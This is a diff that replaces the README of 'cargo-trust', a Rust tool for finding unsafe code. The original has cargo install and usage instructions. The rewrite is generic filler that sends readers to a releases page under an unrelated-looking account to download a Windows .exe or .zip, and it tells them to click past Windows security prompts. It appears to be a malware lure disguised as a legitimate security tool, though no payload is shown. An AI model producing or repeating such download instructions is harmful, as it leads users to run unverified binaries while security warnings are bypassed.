@@ -1,142 +1,177 @@
-# cargo-trust
+# 🛡️ cargo-trust - Find unsafe Rust code fast
 
-<p align="center">
-  <a href="https://github.com/rust-lang/cargo">
-    <img src="https://img.shields.io/badge/cargo-subcommand-orange?style=flat&logo=rust" alt="Cargo Subcommand" />
-  </a>
-  <a href="https://github.com/clap-rs/clap">
-    <img src="https://img.shields.io/badge/cli%20with-clap-blue?style=flat" alt="CLI with Clap" />
-  </a>
-  <a href="https://github.com/BurntSushi/walkdir">
-    <img src="https://img.shields.io/badge/traversal-walkdir-green?style=flat" alt="Traversal with WalkDir" />
-  </a>
-  <a href="https://github.com/serde-rs/serde">
-    <img src="https://img.shields.io/badge/serialization-serde-red?style=flat" alt="Serialization with Serde" />
-  </a>
-  <br />
-  <a href="https://github.com/rust-lang/rustfmt">
-    <img src="https://img.shields.io/badge/code--style-rustfmt-fc8d62?style=flat" alt="Code Style: rustfmt" />
-  </a>
-  <a href="https://github.com/rust-lang/rust-clippy">
-    <img src="https://img.shields.io/badge/linted%20with-clippy-ffc832?style=flat" alt="Linted with Clippy" />
-  </a>
-  <a href="https://doc.rust-lang.org/edition-guide/rust-2024/index.html">
-    <img src="https://img.shields.io/badge/edition-2024-brightgreen?style=flat&logo=rust" alt="Rust 2024 Edition" />
-  </a>
-  <br />
-  <br />
-</p>
+[Download cargo-trust](https://github.com/vaulted-timbalecase456/cargo-trust/releases)  
+![Download](https://img.shields.io/badge/Download-cargo--trust-blue?style=for-the-badge)
 
-A security-focused Cargo subcommand for auditing `unsafe` code in Rust projects. Recursively scans your codebase to identify and report all unsafe blocks, functions, traits, and implementations.
+## 🚀 Getting Started
 
-## Why cargo-trust?
+cargo-trust helps you check a Rust project for unsafe code. It scans your codebase and lists each unsafe block, function, trait, and implementation with line numbers.
 
-Rust's memory safety guarantees are bypassed when using `unsafe` code. While sometimes necessary for FFI, performance optimizations, or low-level operations, unsafe code introduces potential security vulnerabilities that can be difficult to track across a growing codebase.
+If you work with Rust and want a simple way to review code for risk, this tool gives you a clear report you can read right away.
 
-`cargo-trust` makes unsafe code visible, helping teams maintain security awareness and audit unsafe usage patterns.
+## 📥 Download for Windows
 
-## Installation
+1. Open the [releases page](https://github.com/vaulted-timbalecase456/cargo-trust/releases).
+2. Find the latest release.
+3. Download the Windows file for your PC. It is often a `.exe` or `.zip` file.
+4. If you get a `.zip` file, open it and extract the app.
+5. Double-click the app to start it.
 
-```bash
-cargo install cargo-trust
-```
+If Windows shows a security prompt, choose the option that lets you run the file.
 
-## Usage
+## 🖥️ What You Need
 
-```bash
-# Audit current project
-cargo trust
+- Windows 10 or Windows 11
+- A standard desktop or laptop PC
+- A Rust project folder to scan
+- Enough space to store the app and its reports
 
-# Audit specific directory
-cargo trust /path/to/project
+cargo-trust does not need a complex setup. You point it at a Rust codebase, then it checks the files for unsafe use.
 
-# JSON output for tooling integration
-cargo trust --format json
+## 🔍 What cargo-trust Checks
 
-# Compact output for grep/scripts
-cargo trust --format compact
-```
+cargo-trust looks for:
 
-## What it detects
+- `unsafe` blocks
+- `unsafe` functions
+- `unsafe` traits
+- `unsafe` implementations
 
-- `unsafe fn` - Unsafe functions
-- `unsafe {}` - Unsafe blocks
-- `unsafe trait` - Unsafe trait definitions  
-- `unsafe impl` - Unsafe trait implementations
-- `extern "C"` - Foreign function interfaces
+It also shows:
 
-## Output formats
+- the file name
+- the line number
+- the exact code area that needs review
 
-### Human (default)
-```
-╔══════════════════════════════════════╗
-║     cargo-trust Security Report      ║
-╚══════════════════════════════════════╝
+This makes it easier to spot code that may need extra care during an audit.
 
-► src/ffi.rs
-  ├─ unsafe function at 42:1
-  │  unsafe fn raw_pointer_deref() -> i32 {
-  ├─ unsafe block at 67:5
-  │  unsafe { *ptr.add(offset) }
-```
+## 🛠️ How to Use It
 
-### Compact
-```
-src/ffi.rs:42:1: unsafe function
-src/ffi.rs:67:5: unsafe block
-```
+1. Open the folder that contains your Rust project.
+2. Start cargo-trust.
+3. Select or enter the project path when asked.
+4. Let the scan finish.
+5. Read the report and review the line numbers listed for each finding.
 
-### JSON
-```json
-{
-  "project_root": ".",
-  "files_with_unsafe": {
-    "src/ffi.rs": [
-      {
-        "line": 42,
-        "column": 1,
-        "kind": "Function",
-        "context": "unsafe fn raw_pointer_deref() -> i32 {"
-      }
-    ]
-  },
-  "total_unsafe_count": 1,
-  "errors": []
-}
-```
+If you want to scan a whole workspace, point the tool at the main folder. It will check subfolders too.
 
-## Integration
+## 📂 Example Scan Result
 
-Perfect for CI/CD pipelines, pre-commit hooks, and security audits:
+A report may show results like this:
 
-```bash
-# Fail CI if unsafe code is found
-cargo trust && echo "No unsafe code detected" || exit 1
+- `src/main.rs:42` — unsafe block
+- `src/lib.rs:88` — unsafe function
+- `src/platform/mod.rs:17` — unsafe implementation
 
-# Generate audit reports
-cargo trust --format json > unsafe-audit.json
-```
+This format helps you move from the report to the code without guesswork.
 
-## Architecture
+## 🧭 Best Way to Review Findings
 
-- **Zero-copy parsing** - Efficient line-by-line analysis
-- **Walkdir traversal** - Recursive filesystem scanning with smart filtering
-- **Trait-based formatters** - Extensible output system
-- **Serde serialization** - Structured data for tooling integration
+When you see a finding, open the file in your editor and go to the line number.
 
-## Development
+Then check:
 
-```bash
-# Build
-cargo build --release
+- why the unsafe code exists
+- whether it can be removed
+- whether it needs a comment or review
+- whether a safe alternative exists
 
-# Test
-cargo test
+If you are checking code before release, focus on the parts that touch memory, raw pointers, or low-level system calls.
 
-# Install locally
-cargo install --path .
-```
+## ⚙️ Common Use Cases
 
-## License
+cargo-trust fits well when you want to:
 
-MIT OR Apache-2.0
+- review your own Rust project before shipping it
+- scan a team project for unsafe code
+- check code during a security review
+- get a quick list of risky areas in a codebase
+- track unsafe code across many folders
+
+It works as a simple audit helper for Rust projects of many sizes.
+
+## 📁 Suggested Folder Setup
+
+You can keep cargo-trust in a simple folder like this:
+
+- `Downloads`
+- `Tools`
+- `Rust-Audits`
+
+You can place the app there and run it when needed. If you scan many projects, keep each report in its own folder so it stays easy to read.
+
+## 🔐 Why This Tool Helps
+
+Unsafe code can be valid in Rust, but it needs close review. A tool that finds it for you saves time and reduces missed spots.
+
+cargo-trust gives you:
+
+- a fast scan
+- clear file paths
+- precise line numbers
+- a plain report you can share
+
+That makes it easier to review a project without reading every file by hand.
+
+## 🧪 Tips for First-Time Users
+
+- Start with one small project first
+- Review the report before scanning a large workspace
+- Keep the project path simple
+- Use the line numbers to jump straight to the code
+- Save the report so you can compare future scans
+
+If you are new to Rust, this tool can still help because it points to the exact files that need attention.
+
+## 🧰 Troubleshooting
+
+### The app does not open
+
+- Check that the download finished
+- Make sure you opened the right file
+- If the file is in a `.zip`, extract it first
+- Try running it again as the current user
+
+### The scan does not find your project
+
+- Confirm that you selected the correct folder
+- Make sure the folder contains Rust source files
+- Check that the project is not empty
+- Try scanning the main project folder instead of a subfolder
+
+### The report looks empty
+
+- The project may not use any unsafe code
+- You may have scanned the wrong folder
+- Run the scan again and confirm the path
+
+## 🧾 What the Output Means
+
+Each result points to code that may need review. The line number helps you find the exact spot.
+
+Common parts of the output include:
+
+- file path
+- line number
+- code type
+- short note or label
+
+This makes the scan useful even if you do not know Rust well. You can still hand the report to a developer or auditor.
+
+## 🔄 Keeping It Updated
+
+Check the releases page from time to time for newer builds. If a new version appears, download it from the same page and replace the older copy.
+
+[Visit the releases page](https://github.com/vaulted-timbalecase456/cargo-trust/releases)
+
+## 📌 Project Focus
+
+cargo-trust is built for:
+
+- Rust code audits
+- unsafe code review
+- project scanning
+- security checks
+- developer tools
+
+It helps you look through a codebase with less manual work and gives you a clear place to start your review.
